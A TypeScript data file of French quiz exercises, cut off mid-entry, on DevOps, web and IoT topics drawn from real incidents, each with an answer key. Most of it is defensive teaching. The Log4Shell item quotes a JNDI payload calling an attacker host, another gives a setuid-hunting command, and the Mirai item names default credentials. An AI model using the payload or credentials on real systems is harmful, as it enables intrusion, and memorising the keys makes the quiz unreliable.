import type { Exercise } from '../engine/types';

// ---------------------------------------------------------------------------
// Lot « cas réels » — chaque exercice est ancré sur un incident public
// vérifiable ou une pratique d'entreprise documentée (sources en commentaire).
// Même principe data-driven : ajouter = ajouter un objet.
//
// Options : voir la règle anti-triche en tête de `exercises.ts` (longueurs
// équivalentes, distracteurs plausibles). La position de la bonne réponse est
// randomisée globalement par `shuffle.ts` — inutile de la varier ici.
// ---------------------------------------------------------------------------

export const realWorldExercises: Exercise[] = [
  // =================================================== DOCKER
  {
    id: 'rw-docker-codecov',
    type: 'mcq',
    domain: 'devops',
    topic: 'docker',
    difficulty: 'senior',
    title: 'Le secret fantôme',
    company: 'Codecov (2021)',
    scenario:
      "Incident réel Codecov (avril 2021) : une clé d'un service account a fuité depuis une image Docker publique, alors que le Dockerfile faisait `RUN rm cle.json` juste après l'avoir utilisée.",
    question: 'Pourquoi le `rm` n\'a-t-il pas protégé le secret ?',
    options: [
      'rm échoue en silence quand le fichier est verrouillé par le build',
      "Chaque instruction crée une couche : celle qui contenait le secret reste extractible",
      'Le fichier était trop gros pour être supprimé dans la même couche',
      'rm efface le lien mais laisse le contenu chiffré dans le cache',
    ],
    answer: 1,
    explanation:
      "Une image Docker est un **empilement de couches immuables**. `RUN rm secret.json` ajoute une couche qui *masque* le fichier, mais la couche précédente qui le **contient** reste extractible via `docker history` ou `docker save`. Solutions : **multi-stage build** (le secret reste dans une étape non publiée), ou BuildKit `RUN --mount=type=secret` qui n'écrit jamais le secret dans une couche.",
    tags: ['docker', 'secrets', 'layers', 'supply-chain'],
  },
  {
    id: 'rw-docker-root',
    type: 'mcq',
    domain: 'devops',
    topic: 'docker',
    difficulty: 'intermediate',
    title: 'Conteneur en root',
    company: 'Docker',
    scenario:
      "Un audit de sécurité relève qu'une image web n'a aucune directive `USER` : le process tourne donc en root (comportement par défaut de Docker).",
    question: 'Quel est le risque principal ?',
    options: [
      "Le conteneur isole totalement l'hôte, le risque reste théorique",
      "UID 0 dans le conteneur = UID 0 sur l'hôte : une RCE donne root et facilite l'évasion",
      "L'image sera plus lourde car root embarque plus de paquets",
      "Docker refusera de démarrer une image sans directive USER",
    ],
    answer: 1,
    explanation:
      "Sans user namespaces, **root dans le conteneur est root sur l'hôte**. Une RCE dans l'app donne alors des privilèges élevés et facilite l'évasion. Bonne pratique : créer un utilisateur (`adduser`), `COPY --chown`, `USER app` avant le `CMD`, et au runtime `--cap-drop=ALL`, `--read-only`, `no-new-privileges`. En K8s : `securityContext.runAsNonRoot: true`.",
    tags: ['docker', 'sécurité', 'root', 'user'],
  },

  // =================================================== KUBERNETES
  {
    id: 'rw-k8s-liveness-cascade',
    type: 'mcq',
    domain: 'devops',
    topic: 'kubernetes',
    difficulty: 'senior',
    title: 'La probe qui tue tout',
    company: 'Zalando',
    scenario:
      "Article célèbre de Zalando (« Liveness Probes are Dangerous »). Une liveness probe vérifie la connexion à la base. Lors d'un hoquet de la DB, tous les pods échouent leur probe en même temps.",
    question: 'Que se passe-t-il, et quelle est la bonne conception ?',
    options: [
      'Rien de grave : les pods redémarrent et se réparent tout seuls',
      'Redémarrage simultané de tous les pods (spirale) ; les deps externes vont en readiness',
      'Il suffit d\'augmenter le nombre de replicas pour absorber la panne',
      'La DB doit tourner dans le même pod pour éviter le hoquet',
    ],
    answer: 1,
    explanation:
      "Une **liveness probe** qui teste une dépendance externe transforme une panne de DB en **redémarrage massif** de tous les pods (perte de caches, spirale de mort) sans rien réparer. Règle : la liveness ne teste que ce qu'un **redémarrage local peut corriger** (deadlock). Les dépendances externes (DB, autres services) vont dans la **readiness probe**, qui retire le pod du trafic sans le tuer.",
    tags: ['kubernetes', 'liveness', 'readiness', 'cascade'],
  },
  {
    id: 'rw-k8s-oom-137',
    type: 'mcq',
    domain: 'devops',
    topic: 'kubernetes',
    difficulty: 'intermediate',
    title: 'Exit code 137',
    company: 'Komodor',
    scenario:
      "Un pod Java est tué aléatoirement. `kubectl describe` montre `OOMKilled`, exit code 137.",
    question: 'Que signifie 137 et quelle est la cause ?',
    options: [
      'Une exception applicative non catchée a fait planter la JVM',
      '137 = 128 + 9 (SIGKILL) : le conteneur a dépassé sa limits.memory',
      'Le nœud s\'est éteint et a emporté le pod avec lui',
      'La sonde liveness a échoué et Kubernetes a tué le pod',
    ],
    answer: 1,
    explanation:
      "**137 = 128 + 9** → le process a reçu SIGKILL, ici par l'OOM killer car il a dépassé `limits.memory`. Contrairement au CPU (compressible → throttling), la **mémoire est non-compressible** : au-delà de la limite, kill immédiat. Fixer `requests.memory` (garanti) et `limits.memory` d'après le footprint réel + marge ; pour la JVM aligner `-XX:MaxRAMPercentage` sur la limite.",
    tags: ['kubernetes', 'oomkilled', 'memory', 'limits'],
  },
  {
    id: 'rw-k8s-cpu-throttle',
    type: 'mcq',
    domain: 'devops',
    topic: 'kubernetes',
    difficulty: 'senior',
    title: 'Lenteur inexpliquée',
    company: 'Groundcover',
    scenario:
      "La latence p99 d'un service explose alors que le CPU moyen affiché est à 40 % et le nœud quasi inactif. Les `limits.cpu` sont pourtant définies.",
    question: 'Quelle est la cause probable ?',
    options: [
      'Le réseau du nœud est saturé et met les requêtes en file',
      'CPU throttling : le quota CFS met l\'app en pause entre ses bursts',
      'La mémoire est pleine et le garbage collector tourne sans arrêt',
      'Trop de replicas se disputent le même cœur physique',
    ],
    answer: 1,
    explanation:
      "La **limite CPU** est appliquée par le **CFS** comme un quota de temps par fenêtre de 100 ms. Une app qui burste épuise son quota et est **throttlée** (mise en pause) jusqu'à la fenêtre suivante → latence p99 qui explose, invisible sur l'usage moyen. Surveiller `container_cpu_cfs_throttled_periods_total`. Pour les services latency-sensitive : garder les **requests** mais **retirer les limits CPU**, en protégeant via l'autoscaling de nœuds.",
    tags: ['kubernetes', 'cpu', 'throttling', 'cfs', 'latence'],
  },
  {
    id: 'rw-k8s-rbac-wildcard',
    type: 'find-error',
    domain: 'devops',
    topic: 'security',
    difficulty: 'senior',
    title: 'Le Role trop permissif',
    company: 'CNCF Audit',
    scenario:
      "Un ServiceAccount de CI est lié à ce Role « pour que ça marche ». Un audit le signale comme vecteur d'escalade n°1.",
    question: 'Quel est le problème de sécurité ?',
    language: 'yaml',
    code: `kind: Role
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]`,
    options: [
      'Il manque le champ namespace, le Role ne s\'applique nulle part',
      'Wildcards partout (*/*/*) : équivaut à cluster-admin, invisible aux scanners',
      'apiGroups devrait être écrit en minuscules pour être reconnu',
      'Un Role ne peut pas porter de verbs, il faut un ClusterRole',
    ],
    answer: 1,
    explanation:
      "Des **wildcards** `[\"*\"]` donnent tous les verbes sur toutes les ressources = équivalent **cluster-admin**, sans en porter le nom (donc invisible aux scanners cherchant `cluster-admin`). Moindre privilège : lister explicitement les `verbs` (get/list/watch…) et `resources` nécessaires, préférer des `RoleBinding` namespacés, et `automountServiceAccountToken: false` quand le token n'est pas utilisé.",
    tags: ['kubernetes', 'rbac', 'moindre-privilège', 'sécurité'],
  },

  // =================================================== CI/CD
  {
    id: 'rw-cicd-tjactions',
    type: 'mcq',
    domain: 'devops',
    topic: 'ci-cd',
    difficulty: 'senior',
    title: 'Le tag qui a changé',
    company: 'tj-actions (2025)',
    scenario:
      "Attaque supply chain réelle (CVE-2025-30066, mars 2025) : les attaquants ont rétro-modifié TOUS les tags de version de l'action `tj-actions/changed-files` pour pointer vers du code qui exfiltrait les secrets. 23 000+ dépôts touchés.",
    question: 'Quelle pratique aurait protégé les dépôts ?',
    options: [
      'Utiliser @latest pour toujours récupérer la version corrigée',
      'Épingler les actions tierces à un SHA de commit complet, pas à un tag',
      'Mettre le workflow en privé pour cacher les secrets utilisés',
      'Désactiver GitHub Actions et builder uniquement en local',
    ],
    answer: 1,
    explanation:
      "Un **tag Git est mutable** : un mainteneur (ou un attaquant) peut le déplacer. En épinglant `uses: tj-actions/changed-files@<sha_complet>`, on fige le code exact — les dépôts ainsi épinglés ont été **épargnés**. Compléter avec `permissions:` minimales et Dependabot pour suivre les mises à jour de SHA.",
    tags: ['ci-cd', 'github-actions', 'supply-chain', 'sha-pinning'],
  },
  {
    id: 'rw-cicd-pwn-request',
    type: 'mcq',
    domain: 'devops',
    topic: 'ci-cd',
    difficulty: 'senior',
    title: 'La PR qui vole les secrets',
    company: 'GitHub Security Lab',
    scenario:
      "Un workflow utilise `pull_request_target` et fait un checkout du code de la PR (venant d'un fork) puis l'exécute. Une recherche 2025 a trouvé ~50 dépôts exploitables sur 5000, dont Microsoft et Google.",
    question: 'Pourquoi est-ce dangereux (« pwn request ») ?',
    options: [
      'Ça ralentit le CI en clonant le dépôt deux fois',
      'pull_request_target a les secrets du dépôt de base ; exécuter le code du fork les expose',
      'Les forks ne peuvent de toute façon pas ouvrir de PR',
      'Il faut un token personnel qui n\'est pas fourni par défaut',
    ],
    answer: 1,
    explanation:
      "`pull_request_target` tourne dans le contexte du **dépôt de base, avec ses secrets**. Y checkouter et exécuter le **code non revu d'une PR de fork** permet à un attaquant d'exfiltrer ces secrets. Règle : `pull_request` (sans secrets) pour le code non fiable ; `pull_request_target` (avec secrets) uniquement pour du travail qui **ne checkoute pas** le code de la PR.",
    tags: ['ci-cd', 'github-actions', 'pull_request_target', 'sécurité'],
  },
  {
    id: 'rw-cicd-dockerhub-limit',
    type: 'mcq',
    domain: 'devops',
    topic: 'ci-cd',
    difficulty: 'intermediate',
    title: 'ImagePullBackOff intermittent',
    company: 'AWS',
    scenario:
      "Depuis 2020, des builds CI échouent aléatoirement avec `ImagePullBackOff` sur des images `docker.io`, sans raison apparente. Les runners sont derrière un NAT partagé.",
    question: 'Quelle est la cause et la parade ?',
    options: [
      'Les images publiques sont corrompues côté Docker Hub',
      'Rate limit Docker Hub (100 pulls/6h par IP) : le NAT partagé épuise le quota',
      'Le cluster manque de RAM pour décompresser les images',
      'Il faut redémarrer le nœud pour vider son cache d\'images',
    ],
    answer: 1,
    explanation:
      "Docker Hub limite les pulls **anonymes à 100 / 6 h par IP**. Derrière un NAT partagé (CI mutualisé, cluster), l'IP commune épuise le quota → `ImagePullBackOff` intermittents et déroutants. Parades : **registre miroir / pull-through cache** (ECR, Artifact Registry, Harbor), **s'authentifier** (quota supérieur), vendorer les images de base.",
    tags: ['ci-cd', 'docker-hub', 'rate-limit', 'registry'],
  },

  // =================================================== TERRAFORM
  {
    id: 'rw-tf-state-lock',
    type: 'mcq',
    domain: 'devops',
    topic: 'terraform',
    difficulty: 'intermediate',
    title: 'Deux apply en même temps',
    company: 'HashiCorp',
    scenario:
      "Deux ingénieurs lancent `terraform apply` simultanément sur le même state S3 partagé. Le state finit corrompu, avec des ressources orphelines.",
    question: 'Quel mécanisme empêche cela ?',
    options: [
      'Le versioning S3 seul empêche déjà la corruption concurrente',
      'Le state locking : Terraform verrouille toute écriture (lockfile S3 / DynamoDB)',
      'Il faut deux buckets S3 distincts, un par ingénieur',
      'Terraform détecte et fusionne les conflits sans configuration',
    ],
    answer: 1,
    explanation:
      "Sans **verrou**, deux `apply` concurrents s'écrasent → state corrompu. Terraform verrouille les opérations d'écriture : **lockfile natif S3** (`use_lockfile = true`, Terraform 1.10+) ou l'ancien item de lock DynamoDB. Le **versioning S3 ne protège pas** de la concurrence (il archive seulement). Ne jamais utiliser `-lock=false` en équipe ; débloquer proprement avec `terraform force-unlock`.",
    tags: ['terraform', 'state', 'locking', 's3'],
  },
  {
    id: 'rw-tf-drift',
    type: 'mcq',
    domain: 'devops',
    topic: 'terraform',
    difficulty: 'intermediate',
    title: 'Le hotfix console',
    company: 'Spacelift',
    scenario:
      "Un ingénieur modifie un security group à la main dans la console AWS (hotfix urgent). Au prochain `terraform plan`, Terraform veut détruire/recréer la ressource.",
    question: 'Comment gérer ce drift proprement ?',
    options: [
      'Supprimer le fichier .tfstate pour repartir de zéro',
      'Détecter via plan / apply -refresh-only, puis aligner le state ou ignore_changes',
      'Toujours accepter le destroy/recreate proposé par le plan',
      'Désactiver Terraform définitivement sur cette ressource',
    ],
    answer: 1,
    explanation:
      "Le **drift** = écart entre l'infra réelle et le state. On le détecte avec `terraform plan` ou `apply -refresh-only` (montre le diff sans modifier). Remédiations : `-refresh-only` pour aligner le state, réécrire le `.tf` pour refléter le changement voulu, ou `lifecycle { ignore_changes = [...] }` pour les attributs volontairement gérés hors Terraform. Éviter l'ancien `terraform refresh` (écrase le state sans confirmation).",
    tags: ['terraform', 'drift', 'state', 'refresh'],
  },

  // =================================================== MONITORING
  {
    id: 'rw-mon-histogram',
    type: 'mcq',
    domain: 'devops',
    topic: 'monitoring',
    difficulty: 'senior',
    title: 'Le p99 qui ment',
    company: 'Prometheus',
    scenario:
      "Grafana affiche un p99 de latence à 250 ms, mais les utilisateurs subissent des secondes. Les buckets de l'histogramme s'arrêtent à `le=\"0.25\"` puis `+Inf`.",
    question: 'Pourquoi la mesure est-elle fausse ?',
    options: [
      'Grafana a un bug de rendu sur les quantiles élevés',
      'histogram_quantile est borné par les buckets : au-delà de 0,25 s tout tombe dans +Inf',
      'Il faut redémarrer Prometheus pour recharger les buckets',
      'Le p99 se calcule côté client et non côté serveur',
    ],
    answer: 1,
    explanation:
      "`histogram_quantile()` **interpole linéairement dans le bucket** contenant le quantile. Si les buckets s'arrêtent à `0.25` puis `+Inf`, toutes les latences supérieures tombent dans `+Inf` et la vraie valeur est **inconnue**. Définir les buckets d'après les SLO (couvrir la plage utile), et toujours `sum by (le) (rate(..._bucket[5m]))` **avant** `histogram_quantile` — jamais moyenner des p99 déjà calculés (mathématiquement faux).",
    tags: ['monitoring', 'prometheus', 'histogram', 'percentile'],
  },
  {
    id: 'rw-mon-error-budget',
    type: 'mcq',
    domain: 'devops',
    topic: 'monitoring',
    difficulty: 'intermediate',
    title: 'Error budget',
    company: 'Google SRE',
    scenario:
      "Chez Google, quand un service épuise son « error budget », les lancements de nouvelles features sont gelés jusqu'à ce que la fiabilité remonte.",
    question: 'Qu\'est-ce que l\'error budget ?',
    options: [
      'Le budget financier alloué à l\'équipe SRE pour l\'année',
      '100 % − SLO : la marge d\'indisponibilité tolérée avant de geler les features',
      'Le nombre de bugs autorisés par sprint avant blocage',
      'Le temps de build maximal toléré dans le pipeline CI',
    ],
    answer: 1,
    explanation:
      "**Error budget = 100 % − SLO**. Un SLO de 99,9 % sur 30 jours = ~43 min d'erreurs tolérées. Tant que le budget n'est pas épuisé, on livre des features ; épuisé, on gèle et on fiabilise. Ça aligne dev et SRE **sans arbitrage politique**. Viser 100 % est inutile et hors de prix : le budget est ce qui rend l'innovation possible.",
    tags: ['monitoring', 'sre', 'slo', 'error-budget'],
  },

  // =================================================== LINUX
  {
    id: 'rw-linux-signals',
    type: 'mcq',
    domain: 'devops',
    topic: 'linux',
    difficulty: 'intermediate',
    title: 'SIGTERM vs SIGKILL',
    company: 'Kubernetes',
    scenario:
      "Au déploiement, K8s envoie SIGTERM à un pod, attend 30 s (`terminationGracePeriodSeconds`), puis SIGKILL. Une app perd des requêtes en vol à chaque rollout.",
    question: 'Quelle est la différence clé, et la correction ?',
    options: [
      'Aucune différence réelle : les deux terminent le process',
      'SIGTERM (15) est catchable pour un arrêt propre ; SIGKILL (9) ne l\'est pas',
      'SIGKILL est plus propre car il laisse l\'app fermer ses connexions',
      'Il faut désactiver les signaux pour éviter les pertes de requêtes',
    ],
    answer: 1,
    explanation:
      "**SIGTERM (15)** demande un arrêt propre et **peut être intercepté** : l'app doit fermer ses connexions, finir les requêtes en vol, flush. **SIGKILL (9)** est **non interceptable** : le noyau tue sans cleanup. La bonne pratique : gérer SIGTERM pour un graceful shutdown. Faire `kill -9` par réflexe perd données et verrous.",
    tags: ['linux', 'signals', 'sigterm', 'graceful-shutdown'],
  },
  {
    id: 'rw-linux-setuid',
    type: 'mcq',
    domain: 'devops',
    topic: 'linux',
    difficulty: 'senior',
    title: 'Le bit magique de passwd',
    company: 'Linux',
    scenario:
      "`ls -l /usr/bin/passwd` montre `-rwsr-xr-x root root`. Un pentester cherche des binaires similaires pour élever ses privilèges.",
    question: 'Que fait le `s` (setuid) ?',
    options: [
      'Il rend le fichier lisible et exécutable par tous les utilisateurs',
      'Le binaire s\'exécute avec l\'UID du propriétaire (root), pas de l\'appelant',
      'Il accélère le binaire en le gardant en cache noyau',
      'Il passe le fichier en lecture seule contre toute modification',
    ],
    answer: 1,
    explanation:
      "Le **setuid** (`chmod u+s`, bit 4) fait tourner le binaire avec l'**UID du propriétaire** et non de l'appelant. `passwd` (owner root) peut ainsi écrire dans `/etc/shadow`. Mal employé (binaire custom appelant `system()`, env non assaini), c'est une **escalade de privilèges**. Audit : `find / -perm -4000 -type f 2>/dev/null`. Le noyau ignore le setuid sur les scripts shell.",
    tags: ['linux', 'setuid', 'permissions', 'privesc'],
  },

  // =================================================== GIT
  {
    id: 'rw-git-force-lease',
    type: 'mcq',
    domain: 'devops',
    topic: 'git',
    difficulty: 'intermediate',
    title: 'force vs force-with-lease',
    company: 'Git',
    scenario:
      "Après un rebase, tu dois force-push ta branche de PR. Un collègue vient d'y pousser un commit que tu n'as pas encore.",
    question: 'Quelle commande évite d\'écraser son travail ?',
    options: [
      'git push --force, en prévenant le collègue juste avant',
      'git push --force-with-lease : rejeté si le remote a bougé depuis ton fetch',
      'git push --mirror pour synchroniser toutes les refs',
      'git push -f -f pour forcer deux fois et écraser proprement',
    ],
    answer: 1,
    explanation:
      "`--force` écrase **inconditionnellement** — le commit du collègue est perdu. `--force-with-lease` vérifie d'abord que le remote est bien à l'état que tu connais (ta ref de suivi) ; sinon il **refuse**. Piège : un `git fetch` (ou un IDE qui fetch automatiquement) juste avant met à jour la ref de suivi et peut re-permettre l'écrasement — vérifier l'état avant.",
    tags: ['git', 'force-push', 'force-with-lease', 'collaboration'],
  },
  {
    id: 'rw-git-reflog',
    type: 'mcq',
    domain: 'devops',
    topic: 'git',
    difficulty: 'intermediate',
    title: 'Commits « perdus »',
    company: 'Git',
    scenario:
      "Tu fais `git reset --hard HEAD~5` sur la mauvaise branche. `git log` ne montre plus tes 5 commits. Panique.",
    question: 'Comment les récupérer ?',
    options: [
      'Ils sont définitivement perdus, il faut recommencer',
      'git reflog liste les déplacements de HEAD : y retrouver le hash puis reset dessus',
      'Recloner le dépôt depuis le remote pour les récupérer',
      'git undo annule automatiquement le dernier reset',
    ],
    answer: 1,
    explanation:
      "Le **reflog** enregistre tous les mouvements de HEAD. `git reflog` révèle le hash d'avant le `reset`, qu'on restaure avec `git reset --hard <hash>` ou `git branch recover <hash>`. Limite : le reflog ne suit que les états **committés** — les modifications **non committées** balayées par `--hard` sont bel et bien perdues. Le reflog est **local**.",
    tags: ['git', 'reflog', 'reset', 'récupération'],
  },

  // =================================================== NETWORKING
  {
    id: 'rw-net-dns-ttl',
    type: 'mcq',
    domain: 'web',
    topic: 'networking',
    difficulty: 'intermediate',
    title: 'Migration DNS',
    company: 'Cloudflare',
    scenario:
      "Tu migres un enregistrement A vers une nouvelle IP. Après la bascule, une partie du trafic continue d'aller vers l'ancien serveur pendant des heures.",
    question: 'Quelle est la bonne procédure ?',
    options: [
      'Basculer directement, les resolvers voient le changement aussitôt',
      'Abaisser le TTL 24-48h avant, basculer, puis le remonter',
      'Supprimer le domaine et le recréer avec la nouvelle IP',
      'Changer de registrar pour forcer une propagation immédiate',
    ],
    answer: 1,
    explanation:
      "Les resolvers **cachent** la réponse DNS pendant la durée du **TTL**. Pour une bascule propre : abaisser le TTL (3600 → 300 s) **≥ 24-48 h avant** (au moins 2× l'ancien TTL), faire le changement, puis remonter. Attention : certains resolvers imposent un plancher ou servent du *stale* (RFC 8767) — la « propagation » peut prendre jusqu'à 48 h.",
    tags: ['networking', 'dns', 'ttl', 'migration'],
  },
  {
    id: 'rw-net-cors-credentials',
    type: 'find-error',
    domain: 'web',
    topic: 'networking',
    difficulty: 'senior',
    title: 'CORS avec credentials',
    company: 'MDN',
    scenario:
      "Un front envoie des cookies (`credentials: 'include'`) vers l'API. Le navigateur rejette la réponse malgré ces en-têtes serveur.",
    question: 'Quelle est la configuration invalide ?',
    language: 'yaml',
    code: `Access-Control-Allow-Origin: "*"
Access-Control-Allow-Credentials: "true"`,
    options: [
      'Il manque l\'en-tête Access-Control-Allow-Methods',
      'Allow-Origin: * est interdit avec Allow-Credentials: true (origine exacte requise)',
      'La valeur true doit être écrite en majuscules (TRUE)',
      'Il faut un troisième en-tête Access-Control-Max-Age',
    ],
    answer: 1,
    explanation:
      "La spec CORS **interdit** `Access-Control-Allow-Origin: *` combiné à `Access-Control-Allow-Credentials: true` : le navigateur rejette. Avec credentials (cookies, auth), le serveur doit renvoyer l'**origine exacte** (souvent un echo validé de l'en-tête `Origin`) et ajouter `Vary: Origin`. Rappel : CORS est appliqué **côté navigateur**, il ne protège pas le serveur d'un client non-navigateur.",
    tags: ['networking', 'cors', 'credentials', 'sécurité'],
  },

  // =================================================== SECURITY
  {
    id: 'rw-sec-log4shell',
    type: 'mcq',
    domain: 'software',
    topic: 'security',
    difficulty: 'senior',
    title: 'Log4Shell',
    company: 'Apache (2021)',
    scenario:
      "Décembre 2021, CVE-2021-44228. Une chaîne `${jndi:ldap://attacker.com/a}` dans un simple User-Agent, une fois LOGGÉE par une app Java, déclenche une RCE non authentifiée.",
    question: 'Quelle remédiation est correcte ?',
    options: [
      'Poser formatMsgNoLookups=true, c\'est suffisant',
      'Patcher vers Log4j 2.17.1+ : 2.15 et 2.16 restaient contournables',
      'Redémarrer le serveur pour purger les lookups en mémoire',
      'Renommer le fichier de log pour casser le pattern d\'attaque',
    ],
    answer: 1,
    explanation:
      "Log4j 2 (< 2.15) effectue une **substitution JNDI** sur le contenu loggé → chargement d'une classe Java distante = **RCE**. Piège d'examen : `formatMsgNoLookups=true` et même 2.15/2.16 sont **insuffisants** (contournements CVE-2021-45046 / 45105). La vraie remédiation : **2.17.1+**, ou retirer `JndiLookup` du classpath. Penser aux dépendances **transitives** (d'où l'intérêt d'un SBOM).",
    tags: ['security', 'log4shell', 'rce', 'cve'],
  },
  {
    id: 'rw-sec-solarwinds',
    type: 'mcq',
    domain: 'software',
    topic: 'security',
    difficulty: 'senior',
    title: 'La signature qui ne protège pas',
    company: 'SolarWinds (2020)',
    scenario:
      "Fin 2020, un backdoor (SUNBURST) est distribué SIGNÉ via les mises à jour officielles Orion. ~18 000 clients l'ont installé. Le binaire était valablement signé.",
    question: 'Comment le code malveillant a-t-il été signé légitimement ?',
    options: [
      'La clé privée de signature a été volée sur un poste dev',
      'Un malware modifiait le code au build, avant compilation : donc signé normalement',
      'La signature du binaire était habilement falsifiée',
      'SolarWinds ne signait pas encore ses binaires à l\'époque',
    ],
    answer: 1,
    explanation:
      "**SUNSPOT** surveillait `MsBuild.exe` et **injectait la backdoor dans le code source juste avant compilation** → le binaire final était compilé et **signé légitimement**. Se fier à la signature ne suffit donc pas : il faut sécuriser la **chaîne de build** (builds hermétiques/isolés, provenance vérifiable façon SLSA, surveillance de l'environnement de compilation, pas seulement du dépôt source).",
    tags: ['security', 'supply-chain', 'solarwinds', 'build'],
  },
  {
    id: 'rw-sec-owasp-idor',
    type: 'mcq',
    domain: 'web',
    topic: 'security',
    difficulty: 'intermediate',
    title: 'Changer l\'ID dans l\'URL',
    company: 'OWASP',
    scenario:
      "Un pentest : en changeant `/api/orders/1234` en `/api/orders/1235`, un utilisateur voit la commande d'un autre. C'est la vulnérabilité n°1 de l'OWASP Top 10 (2021).",
    question: 'De quelle catégorie s\'agit-il ?',
    options: [
      'Injection SQL via un paramètre d\'URL non échappé',
      'A01 Broken Access Control (IDOR) : pas de contrôle d\'autorisation par objet',
      'XSS stockée renvoyant les données d\'un autre utilisateur',
      'Buffer overflow sur le parsing de l\'identifiant numérique',
    ],
    answer: 1,
    explanation:
      "Accéder à la ressource d'autrui en changeant un identifiant = **IDOR**, sous-catégorie de **A01 Broken Access Control**, n°1 du Top 10 2021. La correction n'est pas de masquer l'ID mais de **vérifier l'autorisation côté serveur** pour chaque objet (l'utilisateur courant possède-t-il cette commande ?). Ne jamais se fier à l'obscurité de l'identifiant.",
    tags: ['security', 'owasp', 'idor', 'access-control'],
  },

  // =================================================== IoT
  {
    id: 'rw-iot-qos',
    type: 'mcq',
    domain: 'iot',
    topic: 'iot-edge',
    difficulty: 'intermediate',
    title: 'MQTT QoS',
    company: 'EMQX',
    scenario:
      "Une flotte de capteurs envoie de la télémétrie tolérante aux pertes sur un réseau cellulaire instable. L'équipe hésite entre QoS 0, 1 et 2.",
    question: 'Quel compromis est correct ?',
    options: [
      'QoS 2 partout : c\'est toujours le choix le plus sûr',
      'QoS 1 (at least once) : livré mais doublons possibles → consommateur idempotent',
      'QoS 0 garantit la livraison sans surcharge réseau',
      'Le niveau de QoS ne change rien pour de la télémétrie',
    ],
    answer: 1,
    explanation:
      "**QoS 0** (at most once) : fire-and-forget, pertes possibles. **QoS 1** (at least once) : livraison garantie mais **doublons possibles** → consommateur idempotent. **QoS 2** (exactly once) : handshake en 4 messages, zéro perte/doublon mais coûteux. Pour de la télémétrie haute fréquence tolérante aux pertes, QoS 1 (voire 0) est le bon compromis ; QoS 2 partout sature le broker. Le QoS effectif = min(publication, souscription).",
    tags: ['iot', 'mqtt', 'qos', 'idempotence'],
  },
  {
    id: 'rw-iot-mirai',
    type: 'mcq',
    domain: 'iot',
    topic: 'security',
    difficulty: 'intermediate',
    title: 'Le botnet Mirai',
    company: 'Dyn (2016)',
    scenario:
      "21 octobre 2016 : un DDoS massif (~1 Tbps) contre le fournisseur DNS Dyn rend Twitter, Spotify, GitHub et Netflix inaccessibles. Le botnet Mirai comptait 100 000+ objets connectés.",
    question: 'Comment Mirai a-t-il recruté autant d\'appareils ?',
    options: [
      'Une faille zero-day sophistiquée dans le firmware des caméras',
      'En testant une liste d\'identifiants d\'usine par défaut sur Telnet/SSH',
      'Par phishing email ciblant les propriétaires d\'objets connectés',
      'En cassant le chiffrement TLS des flux vidéo des caméras',
    ],
    answer: 1,
    explanation:
      "Mirai n'avait rien de sophistiqué : il scannait **Telnet/SSH** et testait une **liste d'identifiants d'usine** (`admin/admin`, `root/xc3511`…). Des caméras et routeurs jamais reconfigurés ont formé un botnet géant. En visant **Dyn (DNS)**, l'effet était démultiplié. Leçons : bannir les credentials par défaut, fermer Telnet, segmenter l'IoT, prévoir des mises à jour OTA, et ne pas concentrer son DNS sur un seul fournisseur.",
    tags: ['iot', 'mirai', 'ddos', 'credentials', 'dns'],
  },
  {
    id: 'rw-iot-ota-ab',
    type: 'mcq',
    domain: 'iot',
    topic: 'iot-edge',
    difficulty: 'senior',
    title: 'OTA sans briquer la flotte',
    company: 'Mender',
    scenario:
      "Un fabricant doit pousser un firmware sur des milliers de devices Linux distants. Un firmware buggé sans reprise transformerait la flotte en presse-papiers.",
    question: 'Quelle architecture OTA évite le brickage ?',
    options: [
      'Flasher directement la partition active du device',
      'Partitions A/B : écrire sur l\'inactive, basculer, rollback auto si healthcheck KO',
      'Envoyer le firmware par email au propriétaire du device',
      'Désactiver les mises à jour pour ne jamais risquer un brick',
    ],
    answer: 1,
    explanation:
      "Le schéma **A/B (dual-bank)** : le device fonctionne sur A, télécharge et écrit l'image sur B (opérationnel pendant le download), puis le bootloader bascule sur B au reboot. Si B **échoue un healthcheck**, **rollback automatique** sur A → pas de brickage. Exige une image **signée** et un **watchdog** qui *commit* le boot seulement après validation, sinon rollback intempestif ou blocage.",
    tags: ['iot', 'ota', 'partitions-ab', 'rollback'],
  },

  // =================================================== WEB
  {
    id: 'rw-web-sw-strategies',
    type: 'mcq',
    domain: 'web',
    topic: 'frontend',
    difficulty: 'intermediate',
    title: 'Stratégies de cache PWA',
    company: 'web.dev',
    scenario:
      "Ta PWA doit marcher hors-ligne. Le service worker intercepte les `fetch` comme un proxy. Tu choisis une stratégie par type de ressource.",
    question: 'Quelle stratégie pour le HTML/JS non versionné (sans hash) ?',
    options: [
      'Cache-first : servir immédiatement la version en cache',
      'Network-first (fallback cache) : cache-first bloquerait sur une vieille version',
      'Cache-only : ne jamais aller sur le réseau pour ces fichiers',
      'Peu importe, le service worker choisit tout seul',
    ],
    answer: 1,
    explanation:
      "**Cache-first** convient aux **assets fingerprintés** (`app.a1b2.js`) : le hash change avec le contenu, donc jamais de version périmée. Pour du **HTML/JS non versionné**, cache-first **bloque** les utilisateurs sur une vieille version → préférer **network-first** (dernière version si en ligne, cache en secours hors-ligne) ou stale-while-revalidate. Et nettoyer les vieux caches à l'`activate`.",
    tags: ['web', 'pwa', 'service-worker', 'cache'],
  },
  {
    id: 'rw-web-inp',
    type: 'mcq',
    domain: 'web',
    topic: 'frontend',
    difficulty: 'intermediate',
    title: 'Core Web Vitals 2024',
    company: 'Google',
    scenario:
      "En mars 2024, Google a changé une de ses trois Core Web Vitals. Une équipe doit mettre à jour son monitoring de performance.",
    question: 'Quel changement a eu lieu ?',
    options: [
      'LCP a été supprimé des Core Web Vitals',
      'INP (≤ 200 ms) a remplacé le FID le 12 mars 2024',
      'CLS est devenu une métrique optionnelle',
      'Toutes les métriques sont passées du p75 au p50',
    ],
    answer: 1,
    explanation:
      "Le **12 mars 2024**, **INP** (Interaction to Next Paint, ≤ 200 ms) a remplacé le FID comme métrique de réactivité. Différence clé : le FID ne mesurait que le **premier** délai d'interaction ; l'INP mesure la latence de **toutes** les interactions. Les trois CWV (LCP ≤ 2,5 s, INP ≤ 200 ms, CLS ≤ 0,1) sont évaluées au **75e percentile** des données terrain (CrUX) — optimiser en lab (Lighthouse) ne suffit pas.",
    tags: ['web', 'core-web-vitals', 'inp', 'performance'],
  },
  {
    id: 'rw-web-stampede',
    type: 'mcq',
    domain: 'web',
    topic: 'backend',
    difficulty: 'senior',
    title: 'Cache stampede',
